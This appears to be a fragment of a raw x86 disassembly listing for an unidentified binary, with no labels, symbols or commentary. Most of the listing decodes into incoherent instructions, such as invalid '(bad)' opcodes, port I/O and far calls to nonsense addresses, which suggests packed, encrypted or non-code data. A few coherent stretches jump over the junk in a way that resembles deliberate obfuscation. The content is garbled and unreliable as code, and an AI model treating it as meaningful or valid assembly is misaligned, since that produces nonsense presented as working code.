  403cab:	mov    eax,ds:0x9fccf97e
  403cb0:	sub    DWORD PTR [ebx+0x7d11bf87],edx
  403cb6:	inc    ebp
  403cb7:	mov    BYTE PTR [edx],0x79
  403cba:	leave  
  403cbb:	cmp    al,0x83
  403cbd:	cdq    
  403cbe:	xchg   ebp,eax
  403cbf:	jo     0x403c5a
  403cc1:	stc    
  403cc2:	jbe    0x403cf0
  403cc4:	ins    BYTE PTR es:[edi],dx
  403cc5:	pop    ds
  403cc6:	and    eax,DWORD PTR [edi]
  403cc8:	std    
  403cc9:	jge    0x403c96
  403ccb:	sbb    BYTE PTR [esi-0x1e],dh
  403cce:	add    DWORD PTR [ecx],eax
  403cd0:	out    dx,eax
  403cd1:	or     al,0x1
  403cd3:	scas   al,BYTE PTR es:[edi]
  403cd4:	addr16 add al,0x9e
  403cd7:	mov    BYTE PTR [edx-0x654ffa0f],0xf3
  403cde:	leave  
  403cdf:	mov    BYTE PTR [edx+0x1111667b],dh
  403ce5:	aas    
  403ce6:	dec    ebp
  403ce7:	shl    DWORD PTR [edx+ebx*4+0x7c2844cc],0x19
  403cef:	popa   
  403cf0:	cmc    
  403cf1:	mov    edx,0x2fc3bff
  403cf6:	pop    ebp
  403cf7:	sbb    al,0x60
  403cf9:	dec    esi
  403cfa:	mov    ah,0x1a
  403cfc:	adc    eax,0x49e29281
  403d01:	into   
  403d02:	(bad)  [esi-0x295ad20]
  403d08:	popf   
  403d09:	sub    dh,BYTE PTR ds:0x33c5eaa6
  403d0f:	or     al,0x5c
  403d11:	pop    esi
  403d12:	aam    0x20
  403d14:	pop    es
  403d15:	inc    eax
  403d16:	inc    ebp
  403d17:	(bad)  
  403d18:	dec    esi
  403d19:	in     eax,0xfd
  403d1b:	lds    esp,FWORD PTR [ecx+0x7e6d635d]
  403d21:	fstp   DWORD PTR [esi+0x76]
  403d24:	ja     0x403d9a
  403d26:	jns    0x403cb8
  403d28:	aaa    
  403d29:	pop    ds
  403d2a:	jo     0x403d0d
  403d2c:	cmp    ebp,DWORD PTR [ecx-0x31]
  403d2f:	sar    BYTE PTR cs:[edx+0x7e],0x75
  403d34:	ins    DWORD PTR es:[edi],dx
  403d35:	adc    al,BYTE PTR [ecx]
  403d37:	adc    DWORD PTR [esi-0x37205c8f],edx
  403d3d:	pop    eax
  403d3e:	clc    
  403d3f:	sbb    al,0x45
  403d41:	cli    
  403d42:	sub    BYTE PTR [ecx],bl
  403d44:	pop    ecx
  403d45:	std    
  403d46:	outs   dx,DWORD PTR ds:[esi]
  403d47:	je     0x403d63
  403d49:	(bad)  
  403d4a:	jl     0x403cef
  403d4c:	jle    0x403d59
  403d4e:	cmp    esi,DWORD PTR [esi]
  403d50:	jle    0x403dbb
  403d52:	adc    eax,DWORD PTR ss:[ecx+0x32bb339f]
  403d59:	loopne 0x403d38
  403d5b:	mov    ch,0xc2
  403d5d:	push   ebx
  403d5e:	xor    eax,0xcb1b2a08
  403d63:	lock sub cl,bh
  403d66:	inc    ebp
  403d67:	dec    esi
  403d68:	dec    ebx
  403d69:	sbb    BYTE PTR [edi-0x44fd03ce],dl
  403d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d70:	adc    eax,0xc164f55b
  403d75:	mov    dl,0x55
  403d77:	je     0x403dc6
  403d79:	scas   eax,DWORD PTR es:[edi]
  403d7a:	outs   dx,BYTE PTR ds:[esi]
  403d7b:	sbb    DWORD PTR [eax],edi
  403d7d:	xchg   ebx,eax
  403d7e:	adc    al,0xc8
  403d80:	mov    dl,0x87
  403d82:	addr16 (bad) 
  403d84:	pop    esp
  403d85:	nop
  403d86:	clc    
  403d87:	sub    edi,DWORD PTR [ecx-0x184dfe9a]
  403d8d:	mov    cl,0x90
  403d8f:	cmp    DWORD PTR [edi-0x56],esi
  403d92:	sub    eax,eax
  403d94:	push   ebx
  403d95:	adc    al,BYTE PTR [edi-0x1c]
  403d98:	mov    ah,0x22
  403d9a:	mov    ecx,0x4b83a3ca
  403d9f:	cld    
  403da0:	dec    esi
  403da1:	loop   0x403d2d
  403da3:	xchg   ebp,eax
  403da4:	pop    ds
  403da5:	mov    cl,0xf0
  403da7:	and    DWORD PTR [esi-0x40],esi
  403daa:	sub    al,0xcf
  403dac:	fdiv   DWORD PTR [edx+0x2d]
  403daf:	fsubr  DWORD PTR [ebp-0x51]
  403db2:	xor    DWORD PTR [ecx+edx*2+0x4e521eb1],ecx
  403db9:	adc    DWORD PTR [eax+0x6e502c1c],ebx
  403dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dc0:	call   0xb92d:0x33bee905
  403dc7:	xlat   BYTE PTR ds:[ebx]
  403dc8:	inc    ebx
  403dc9:	mov    ch,0x66
  403dcb:	imul   ecx,esi,0x94a5fba6
  403dd1:	push   edx
  403dd2:	out    dx,al
  403dd3:	and    eax,esi
  403dd5:	mov    al,0xd
  403dd7:	pop    edx
  403dd8:	inc    ebx
  403dd9:	pop    esi
  403dda:	data16 hlt 
  403ddc:	test   BYTE PTR [ecx-0x3f95c7ad],al
  403de2:	mov    esp,0x39b2ff83
  403de7:	cmp    esi,eax
  403de9:	xchg   BYTE PTR [esi-0x657f1116],ah
  403def:	stos   DWORD PTR es:[edi],eax
  403df0:	adc    dh,bh
  403df2:	popa   
  403df3:	lahf   
  403df4:	jl     0x403db5
  403df6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403df7:	ss (bad) 
  403df9:	rcr    ecx,1
  403dfb:	test   ebp,edx
  403dfd:	inc    esp
  403dfe:	push   0x6d
  403e00:	in     al,0xfe
  403e02:	(bad)  
  403e03:	stc    
  403e04:	xor    BYTE PTR [eax-0x4ca1afc9],0x4
  403e0b:	in     al,0x35
  403e0d:	xor    DWORD PTR [ebx-0xf],ecx
  403e10:	and    ebp,DWORD PTR [edi]
  403e12:	jns    0x403df2
  403e14:	fld    st(1)
  403e16:	push   edx
  403e17:	xchg   ecx,eax
  403e18:	mov    ebx,0xd10e09dc
  403e1d:	mov    ah,0x8d
  403e1f:	inc    edx
  403e20:	inc    edi
  403e21:	std    
  403e22:	(bad)  
  403e23:	in     al,0x3
  403e25:	cmp    DWORD PTR [edi],edx
  403e27:	sbb    al,0xfc
  403e29:	xchg   ecx,eax
  403e2a:	fild   QWORD PTR [ebx+0x4fb5aceb]
  403e30:	mov    dh,dl
  403e32:	mov    ebp,0x6389a750
  403e37:	into   
  403e38:	dec    edi
  403e39:	mov    ds:0xc11d3ef1,eax
  403e3e:	push   ecx
  403e3f:	push   cs
  403e40:	ins    BYTE PTR es:[edi],dx
  403e41:	mov    cl,0x14
  403e43:	aad    0x33
  403e45:	psubusb mm7,QWORD PTR ds:0x1d8721ef
  403e4c:	xor    eax,0xb56a9b76
  403e51:	and    bl,dl
  403e53:	inc    esp
  403e54:	jle    0x403ed2
  403e56:	(bad)  
  403e57:	xlat   BYTE PTR ds:[ebx]
  403e58:	adc    ecx,DWORD PTR [esi+0x178d9ef6]
  403e5e:	out    dx,al
  403e5f:	mov    WORD PTR [ebp-0x2bfba93f],gs
  403e65:	sar    DWORD PTR [ebx-0x4debe308],0x45
  403e6c:	jae    0x403e1c
  403e6e:	fisttp DWORD PTR [edx-0x53bce18a]
  403e74:	sub    bl,dh
  403e76:	das    
  403e77:	mov    bl,0x43
  403e79:	sahf   
  403e7a:	adc    eax,0x44c46ec9
  403e7f:	jns    0x403eed
  403e81:	pushf  
  403e82:	scas   eax,DWORD PTR es:[edi]
  403e83:	test   BYTE PTR [eax],al
  403e85:	xor    eax,0xa93eadab
  403e8a:	lock xor eax,0x117d677e
  403e90:	addr16 pop ecx
  403e92:	adc    ebx,ebp
  403e94:	mov    al,cl
  403e96:	pusha  
  403e97:	iret   
  403e98:	push   ebp
  403e99:	mov    ebp,0x60f5e941
  403e9e:	(bad)  
  403e9f:	mov    edi,0xb781c4f8
  403ea4:	inc    edx
  403ea5:	pop    esp
  403ea6:	adc    eax,0x68a6d763
  403eab:	adc    al,0xc8
  403ead:	jnp    0x403ec1
  403eaf:	adc    edi,esi
  403eb1:	imul   edi,DWORD PTR [edx],0xffffffdc
  403eb4:	into   
  403eb5:	iret   
  403eb6:	mov    edx,DWORD PTR [esi]
  403eb8:	push   ecx
  403eb9:	jmp    0xa705:0x1e6d7493
  403ec0:	and    al,0x7d
  403ec2:	and    BYTE PTR [edx],0x1d
  403ec5:	push   cs
  403ec6:	lods   al,BYTE PTR ds:[esi]
  403ec7:	(bad)  
  403ec8:	repnz dec esp
  403eca:	es mov edx,0x3be3eec8
  403ed0:	push   edx
  403ed1:	adc    BYTE PTR [esi+0x60aa9a87],dh
  403ed7:	sub    bh,dh
  403ed9:	enter  0xe4c9,0xab
  403edd:	adc    al,0x41
  403edf:	into   
  403ee0:	dec    BYTE PTR [ecx-0x47e0258b]
  403ee6:	sbb    esp,DWORD PTR [edx+0x65]
  403ee9:	xchg   esp,eax
  403eea:	dec    esi
  403eeb:	cmp    esp,DWORD PTR [ecx]
  403eed:	sub    eax,esp
  403eef:	adc    DWORD PTR [esi+0x61],esi
  403ef2:	ja     0x403f18
  403ef4:	fcmovne st,st(3)
  403ef6:	fdivr  st(0),st
  403ef8:	mov    ebp,0x8232d9c2
  403efd:	pop    esi
  403efe:	and    al,BYTE PTR [edi+ebp*2+0x3a]
  403f02:	cwde   
  403f03:	dec    ebx
  403f04:	add    BYTE PTR [bp+di],0xb8
  403f08:	cli    
  403f09:	mov    dh,0xa5
  403f0b:	add    eax,DWORD PTR [ecx]
  403f0d:	sbb    DWORD PTR ds:0x42819f,ebx
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x42821f
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x4283ab,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428267,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx+0x675d9dbc],ch
  403f58:	mov    esp,0x1818d7ce
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    BYTE PTR [ecx+0x4c],dh
  403f63:	push   ebx
  403f64:	fistp  QWORD PTR [ebx+edi*4+0x6a]
  403f68:	push   ds
  403f69:	fwait
  403f6a:	repnz cmp al,BYTE PTR [ecx-0x22c9408a]
  403f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f72:	push   edi
  403f73:	push   cs
  403f74:	or     eax,0x498a20bc
  403f7a:	add    DWORD PTR [ebp-0x57a15e53],0xffffff81
  403f81:	inc    ecx
  403f82:	iret   
  403f83:	in     al,dx
  403f84:	hlt    
  403f85:	pop    ebp
  403f86:	xor    al,0xe7
  403f88:	push   esi
  403f89:	sbb    eax,0x24fef490
  403f8e:	sub    BYTE PTR ds:0x306026c4,dh
  403f94:	out    0x29,al
  403f96:	out    dx,al
  403f97:	mov    ecx,0x4bf21c1c
  403f9c:	sti    
  403f9d:	test   DWORD PTR [eax-0x42],edi
  403fa0:	fwait
  403fa1:	adc    BYTE PTR [esi-0x684977f8],dh
  403fa7:	or     BYTE PTR [edx],bh
  403fa9:	push   esi
  403faa:	lds    edx,FWORD PTR [ebx]
  403fac:	mov    ds:0x4de46fe5,al
  403fb1:	dec    esi
  403fb2:	aaa    
  403fb3:	xor    esi,0xb3376efe
  403fb9:	mov    bl,BYTE PTR [ebx-0x74344881]
  403fbf:	jb     0x403fd2
  403fc1:	int3   
  403fc2:	test   BYTE PTR [edx+ebp*8-0x70],ah
  403fc6:	(bad)  
  403fc8:	and    BYTE PTR cs:[edi+0x549b918b],ah
  403fcf:	dec    edx
  403fd0:	pop    ds
  403fd1:	bound  ebp,QWORD PTR [edx-0x58f2d68d]
  403fd7:	inc    esp
  403fd8:	cmp    al,0x4f
  403fda:	lar    esp,WORD PTR [edx+0xe]
  403fde:	test   al,0x9a
  403fe0:	lods   eax,DWORD PTR ds:[esi]
  403fe1:	or     al,0xbb
  403fe3:	aas    
  403fe4:	inc    edx
  403fe5:	fsub   st(2),st
  403fe7:	es or  dh,dh
  403fea:	adc    ah,al
  403fec:	adc    esi,DWORD PTR [ecx+0x2d96959d]
  403ff2:	jno    0x403fef
  403ff4:	(bad)  
  403ff5:	call   DWORD PTR [ebx-0x42]
  403ff8:	inc    ebp
  403ff9:	and    al,0x18
  403ffb:	xor    ebx,ebp
  403ffd:	or     ebx,DWORD PTR [esi+0x40]
  404000:	jns    0x40401f
  404002:	pop    ss
  404003:	xchg   esi,eax
  404004:	jne    0x403f97
  404006:	or     BYTE PTR [esi+ecx*2],ch
  404009:	fmul   QWORD PTR [ecx+esi*1+0x71]
  40400d:	ds mov bh,0x83
  404010:	or     DWORD PTR [ebx+eiz*1-0x22],edi
  404014:	xchg   DWORD PTR [edx+0x7fde1967],eax
  40401a:	inc    esp
  40401b:	sbb    ebp,DWORD PTR [ebx]
  40401d:	ins    DWORD PTR es:[edi],dx
  40401e:	out    0x7d,al
  404020:	sbb    dl,ch
  404022:	push   eax
  404023:	xchg   ecx,eax
  404024:	data16 out dx,al
  404026:	in     al,dx
  404027:	(bad)  
  404029:	enter  0xf987,0x18
  40402d:	call   0x497ca2b1
  404032:	sub    al,0x6d
  404034:	jbe    0x403fdd
  404036:	and    al,0x2
  404038:	xchg   ebx,eax
  404039:	les    esi,FWORD PTR [edi-0x6f]
  40403c:	pushf  
  40403d:	xchg   DWORD PTR [ebx-0x6a],esi
  404040:	mov    eax,0xc6274d99
  404045:	ins    DWORD PTR es:[edi],dx
  404046:	ror    BYTE PTR [eax],cl
  404048:	push   ss
  404049:	adc    dl,cl
  40404b:	xchg   ebx,eax
  40404c:	mov    dl,0xa
  40404e:	mov    cl,0x59
  404050:	shr    DWORD PTR [eax],0x1e
  404053:	xor    al,0x19
  404055:	jbe    0x40408f
  404057:	and    edi,eax
  404059:	outs   dx,DWORD PTR ds:[esi]
  40405a:	add    al,0xf8
  40405c:	dec    edi
  40405d:	xchg   edi,eax
  40405e:	adc    al,0x4a
  404060:	mov    ch,0x5
  404062:	xor    eax,0x5466c496
  404067:	mov    esp,0xc68fb68f
  40406c:	into   
  40406d:	add    al,0xec
  40406f:	jmp    0x4040d9
  404071:	out    dx,eax
  404072:	fnsave [bx+si]
  404075:	add    DWORD PTR [edx-0x3c],ebx
  404078:	loope  0x4040b3
  40407a:	pusha  
  40407b:	ror    DWORD PTR [ecx+0x35],cl
  40407e:	and    al,ah
  404080:	(bad)  
  404081:	mov    ecx,0x736110bd
  404086:	xlat   BYTE PTR ds:[ebx]
  404087:	pop    ebp
  404088:	pop    esp
  404089:	push   edi
  40408a:	scas   al,BYTE PTR es:[edi]
  40408b:	jp     0x40402e
  40408d:	std    
  40408e:	jo     0x4040eb
  404090:	in     eax,0xe1
  404092:	outs   dx,BYTE PTR ds:[esi]
  404093:	popf   
  404094:	pop    edi
  404095:	dec    esi
  404096:	fs out 0xff,eax
  404099:	hlt    
  40409a:	xor    DWORD PTR [ecx],esi
  40409c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40409d:	pop    esi
  40409e:	repz cwde 
  4040a0:	cs mov esi,esp
  4040a3:	mov    eax,ds:0x7fd48acd
  4040a8:	pop    ebp
  4040a9:	es popf 
  4040ab:	fimul  DWORD PTR [eax-0x51]
  4040ae:	and    DWORD PTR [eax-0x46d58530],eax
  4040b4:	jmp    0x404078
  4040b6:	mov    ch,0x80
  4040b8:	jne    0x4040b1
  4040ba:	or     BYTE PTR [edx],al
  4040bc:	xchg   BYTE PTR [edx+0x31],cl
  4040bf:	lods   eax,DWORD PTR ds:[esi]
  4040c0:	pop    ds
  4040c1:	mov    ?,WORD PTR [ebx+edi*4+0x6ab5f60b]
  4040c8:	adc    dh,cl
  4040ca:	stc    
  4040cb:	xchg   esi,eax
  4040cc:	in     eax,dx
  4040cd:	cmp    ebx,DWORD PTR [edi+esi*2+0x1c]
  4040d1:	cs and eax,0x9d485f12
  4040d7:	mov    ds:0xf02a367e,eax
  4040dc:	sub    al,dh
  4040de:	ret    0x6634
  4040e1:	pop    edi
  4040e2:	gs pop edi
  4040e4:	and    esp,0x76357f80
  4040ea:	jge    0x40411e
  4040ec:	loop   0x40410a
  4040ee:	mov    DWORD PTR [edi+ebp*1-0x6ad9c354],esi
  4040f5:	mov    edi,0xbcba7090
  4040fa:	mov    dh,0xe1
  4040fc:	cld    
  4040fd:	sbb    eax,0x331406d2
  404102:	imul   eax,ecx,0xa
  404105:	call   0xe06b3b2b
  40410a:	ret    
  40410b:	and    BYTE PTR [edi],dl
  40410d:	fist   WORD PTR [esp+esi*1]
  404110:	add    BYTE PTR ds:0xb911f0e3,0xbd
  404117:	lods   eax,DWORD PTR ds:[esi]
  404118:	ss sub eax,0xa11c64b9
  40411e:	aaa    
  40411f:	scas   al,BYTE PTR es:[edi]
  404120:	int    0x5a
  404122:	mov    ds:0xac8e5e59,eax
  404127:	push   esp
  404128:	cwde   
  404129:	pop    edx
  40412a:	out    dx,eax
  40412b:	pop    edx
  40412c:	and    eax,0x38420166
  404131:	jle    0x4040d4
  404133:	out    0xb5,eax
  404135:	sahf   
  404136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404137:	add    eax,0x33da5b7e
  40413c:	retf   
  40413d:	scas   eax,DWORD PTR es:[edi]
  40413e:	fiadd  DWORD PTR [eax-0x61]
  404141:	pop    ebp
  404142:	(bad)  
  404143:	(bad)  
  404144:	push   0x70606603
  404149:	fild   QWORD PTR [edx+0xf33d042]
  40414f:	dec    eax
  404150:	push   ds
  404151:	add    BYTE PTR [ecx],ch
  404153:	and    ah,BYTE PTR [ebx+0x38297e4b]
  404159:	mov    ecx,DWORD PTR [edx]
  40415b:	loope  0x404194
  40415d:	gs mov ecx,0x778fe9d4
  404163:	out    0x86,eax
  404165:	fidiv  WORD PTR [eax]
  404167:	mov    bh,0x6d
  404169:	lahf   
  40416a:	iretw  
  40416c:	lea    edi,ss:[ebp+0x3e88199f]
  404173:	xor    esi,ebp
  404175:	popa   
  404176:	nop
  404177:	xchg   edx,eax
  404178:	xchg   edi,eax
  404179:	mov    ebp,0x260feecb
  40417e:	push   ss
  40417f:	mov    edi,0x6e047727
  404184:	sbb    BYTE PTR [eax],cl
  404186:	mov    bh,0x6f
  404188:	out    0xa,eax
  40418a:	inc    eax
  40418b:	dec    edi
  40418c:	mov    dh,0xe8
  40418e:	int3   
  40418f:	ss cld 
  404191:	mov    esi,DWORD PTR [ebx+eiz*8-0x7d1bebf2]
  404198:	sub    eax,DWORD PTR [ebx]
  40419a:	or     al,BYTE PTR [edx-0x66]
  40419d:	scas   al,BYTE PTR es:[edi]
  40419e:	add    edx,esp
  4041a0:	inc    ebp
  4041a1:	test   DWORD PTR [ebx],edi
  4041a3:	dec    esp
  4041a4:	lock mov ch,BYTE PTR [eax-0x4c]
  4041a8:	inc    eax
  4041a9:	scas   al,BYTE PTR es:[edi]
  4041aa:	ins    BYTE PTR es:[edi],dx
  4041ab:	jl     0x4041b8
  4041ad:	(bad)  
  4041ae:	pop    ecx
  4041af:	enter  0x4987,0x65
  4041b3:	lods   eax,DWORD PTR ds:[esi]
  4041b4:	clc    
  4041b5:	dec    esp
  4041b6:	mov    DWORD PTR [edx-0x2d3cce1a],ebp
  4041bc:	sbb    DWORD PTR [esi+0x7a80c0c7],edi
  4041c2:	cdq    
  4041c3:	dec    edx
  4041c4:	pop    eax
  4041c5:	lea    edx,[eax+ecx*8+0x2178dcc7]
  4041cc:	sar    DWORD PTR [eax-0x346aa3a1],0x75
  4041d3:	xor    al,0x6
  4041d5:	clc    
  4041d6:	(bad)  
  4041d7:	lahf   
  4041d8:	cwde   
  4041d9:	(bad)  
  4041db:	je     0x40423d
  4041dd:	(bad)  
  4041de:	fcomp  QWORD PTR [ebx]
  4041e0:	xchg   ebx,eax
  4041e1:	jae    0x404224
  4041e3:	lahf   
  4041e4:	aaa    
  4041e5:	mov    al,ds:0x547c8c70
  4041ea:	pop    eax
  4041eb:	stos   DWORD PTR es:[edi],eax
  4041ec:	sbb    ah,cl
  4041ee:	leave  
  4041ef:	inc    edx
  4041f0:	jmp    0x4041b7
  4041f2:	push   ecx
  4041f3:	sti    
  4041f4:	scas   eax,DWORD PTR es:[edi]
  4041f5:	les    eax,FWORD PTR [eax-0x50]
  4041f8:	int3   
  4041f9:	mov    dl,0xb
  4041fb:	out    0xbf,al
  4041fd:	push   ebp
  4041fe:	(bad)  
  4041ff:	mov    ecx,0x7119a8dd
  404204:	data16 int3 
  404206:	loopne 0x40423c
  404208:	gs enter 0xb5c7,0xcb
  40420d:	fisttp WORD PTR [edi]
  40420f:	cmp    BYTE PTR [eax],al
  404211:	mov    eax,eax
  404213:	inc    edx
  404214:	ds scas eax,DWORD PTR es:[edi]
  404216:	xchg   ecx,eax
  404217:	dec    ecx
  404218:	dec    esi
  404219:	or     DWORD PTR [ecx],0x7e0d92fc
  40421f:	sub    eax,0x528f94ad
  404224:	mov    esi,0xfd5af43a
  404229:	ret    0xa728
  40422c:	inc    ebx
  40422d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40422e:	add    BYTE PTR [edx+ebx*2],ch
  404231:	nop
  404232:	cmp    BYTE PTR ds:0xa3e87002,bh
  404238:	mov    ecx,0x54913ad2
  40423d:	jle    0x4042a7
  40423f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404240:	lea    ebp,ds:0xad07c63b
  404246:	imul   esp,DWORD PTR [ecx+eiz*1-0x33],0xb9a6797b
  40424e:	and    ecx,ebp
  404250:	and    cl,BYTE PTR [eax+0x4dcc0ccb]
  404256:	xchg   esp,eax
  404257:	or     DWORD PTR [eax+0x19],eax
  40425a:	fs dec edx
  40425c:	xchg   ebx,eax
  40425d:	or     eax,DWORD PTR [eax]
  40425f:	xchg   edi,eax
  404260:	loope  0x4042b6
  404262:	std    
  404263:	xor    eax,0x1aa7db8c
  404268:	test   al,0xd1
  40426a:	shl    bh,cl
  40426c:	arpl   WORD PTR [ebx-0x317d670f],sp
  404272:	(bad)  
  404273:	pop    ebx
  404274:	mov    esp,0x7b38b041
  404279:	call   0xf2c5:0xdeba16a9
  404280:	sub    DWORD PTR [esi],0xbc07f6c
  404286:	push   ebp
  404287:	data16 cmp dl,bl
  40428a:	and    DWORD PTR [ebx-0x395a8d4],esp
  404290:	pop    ecx
  404291:	sub    bl,BYTE PTR [ebx]
  404293:	cld    
  404294:	dec    ebx
  404295:	mov    dl,0x2
  404297:	retf   0x8183
  40429a:	pop    ecx
  40429b:	push   edi
  40429c:	or     ebx,DWORD PTR [eax-0x50e87d6f]
  4042a2:	rcr    DWORD PTR gs:[edi],0x6b
  4042a6:	icebp  
  4042a7:	scas   eax,DWORD PTR es:[edi]
  4042a8:	jnp    0x404283
  4042aa:	inc    esp
  4042ab:	jl     0x404329
  4042ad:	sub    eax,DWORD PTR [edx+0x4d]
  4042b0:	pop    ss
  4042b1:	xor    dl,dl
  4042b3:	sbb    ebx,DWORD PTR [edi+0x354102ff]
  4042b9:	mov    ds:0x8db8f3d0,al
  4042be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042bf:	mov    DWORD PTR [eax+0x19],0x2fc59ed2
  4042c6:	cwde   
  4042c7:	lds    ebx,FWORD PTR ds:0xaa034d7f
  4042cd:	test   eax,0xeac3a1c1
  4042d2:	fnsave [ebx]
  4042d4:	dec    ebp
  4042d5:	ins    BYTE PTR es:[edi],dx
  4042d6:	imul   edi,DWORD PTR [edi],0x21
  4042d9:	sub    ebp,ebx
  4042db:	pop    edx
  4042dc:	icebp  
  4042dd:	sbb    eax,0xe08a487d
  4042e2:	jl     0x40433a
  4042e4:	iret   
  4042e5:	in     eax,dx
  4042e6:	add    cl,bh
  4042e8:	xchg   edi,eax
  4042e9:	imul   BYTE PTR [ebp-0x5ed8692a]
  4042ef:	push   esp
  4042f0:	or     ah,ch
  4042f2:	mov    ah,0x3f
  4042f4:	js     0x404328
  4042f6:	addr16 xchg edi,eax
  4042f8:	das    
  4042f9:	fsubr  DWORD PTR [edx+0x757ff]
  4042ff:	mov    ebp,0x5ab92e85
  404304:	mov    al,ds:0xce16714e
  404309:	jmp    0x40431e
  40430b:	stos   BYTE PTR es:[edi],al
  40430c:	inc    edx
  40430d:	inc    edx
  40430e:	jmp    0xbb9c2419
  404313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404314:	les    eax,FWORD PTR [ebx]
  404316:	adc    dh,0xfb
  404319:	mov    eax,0x279325f3
  40431e:	dec    esi
  40431f:	aad    0xc3
  404321:	int3   
  404322:	mov    edx,DWORD PTR [ebx+0x4]
  404325:	and    DWORD PTR ds:0x42826b,ebx
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x42829b
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x428317
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428257
  404344:	and    DWORD PTR ds:0x4283b7,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x42839f
  404355:	sbb    DWORD PTR ds:0x4282ab,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	fwait
  404370:	dec    ebx
  404371:	xchg   DWORD PTR [ebp+edx*2-0x31],edi
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    BYTE PTR [edi+0x14],dh
  40437d:	rcr    esi,cl
  40437f:	push   0xf
  404381:	cmp    BYTE PTR [ebx+eax*2],bh
  404384:	jmp    0x40438b
  404386:	xchg   ecx,eax
  404387:	inc    eax
  404388:	inc    edi
  404389:	xchg   DWORD PTR [esi-0x5c],ebp
  40438c:	popf   
  40438d:	(bad)  
  40438e:	mov    dl,0x8
  404390:	retf   
  404391:	cmp    ecx,ebp
  404393:	sbb    dh,0xb2
  404396:	sbb    esp,ebx
  404398:	xchg   edi,eax
  404399:	or     eax,0x3b07eec8
  40439e:	ins    DWORD PTR es:[edi],dx
  40439f:	push   ebx
  4043a0:	and    DWORD PTR [edx+0x2b],edx
  4043a3:	inc    edx
  4043a4:	jne    0x404380
  4043a6:	adc    dh,BYTE PTR [ebp-0xb]
  4043a9:	inc    edx
  4043aa:	std    
  4043ab:	jecxz  0x4043c0
  4043ad:	jae    0x404359
  4043af:	mov    WORD PTR [edi],ss
  4043b1:	xor    DWORD PTR [esi+0x50a7aaba],ecx
  4043b7:	rcl    BYTE PTR [edx+0x321082e3],0x66
  4043be:	lahf   
  4043bf:	in     al,dx
  4043c0:	call   0x61de96f
  4043c5:	in     al,0xc2
  4043c7:	leave  
  4043c8:	sub    ah,BYTE PTR [eax+0x1184ed47]
  4043ce:	mov    ch,BYTE PTR ds:[ebx+0x3f]
  4043d2:	cmp    al,0xaa
  4043d4:	fisubr WORD PTR [eax-0x20]
  4043d7:	mov    ds:0x6872c2c9,eax
  4043dc:	fisttp QWORD PTR [ebx+0x7e1bee9a]
  4043e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043e3:	and    eax,0xfe43c7b2
  4043e8:	stc    
  4043e9:	add    DWORD PTR [ebx-0x5ac0988a],edi
  4043ef:	mov    al,ch
  4043f1:	cmp    eax,0x887f14c
  4043f6:	(bad)  
  4043f7:	mov    ecx,DWORD PTR [ebx-0x232e6b1a]
  4043fd:	cwde   
  4043fe:	mov    esi,0x18e07c40
  404403:	jae    0x404443
  404405:	or     ecx,0xffffffb7
  404408:	or     eax,0xece6f1ae
  40440d:	jecxz  0x4043e3
  40440f:	test   ecx,ebx
  404411:	rol    BYTE PTR [ebx-0x4b],0x4e
  404415:	mov    cl,al
  404417:	inc    ebp
  404418:	mov    BYTE PTR [esi+ebx*8+0x8a12b09],dl
  40441f:	lods   eax,DWORD PTR ds:[esi]
  404420:	test   DWORD PTR [esi+0x7dec52b2],edx
  404426:	xor    dh,dh
  404428:	mov    fs,WORD PTR [ecx-0x5dac02b3]
  40442e:	jge    0x404475
  404430:	fild   DWORD PTR [esi+ecx*2-0x559e261d]
  404437:	sub    al,0x88
  404439:	cs jg  0x40443c
  40443c:	enter  0xd4e6,0x8a
  404440:	mov    ebp,0xa5ac5225
  404445:	ret    0xaf5
  404448:	jmp    DWORD PTR [edi]
  40444a:	and    esp,0x12
  40444d:	xchg   ebp,eax
  40444e:	mov    bl,0x5f
  404450:	test   ebp,ebp
  404452:	dec    ebp
  404453:	lock sbb BYTE PTR [edi+eax*8-0x43f9a66d],bl
  40445b:	cli    
  40445c:	xchg   ebx,eax
  40445d:	mov    DWORD PTR ds:0x90a0026c,esp
  404463:	pop    esi
  404464:	mov    eax,0xbef98a2f
  404469:	gs icebp 
  40446b:	cs xor al,0xa6
  40446e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40446f:	(bad)  
  404470:	in     al,0x58
  404472:	or     BYTE PTR [ebx],al
  404474:	mov    eax,0xb8f7f45f
  404479:	or     eax,0x54c8e4b
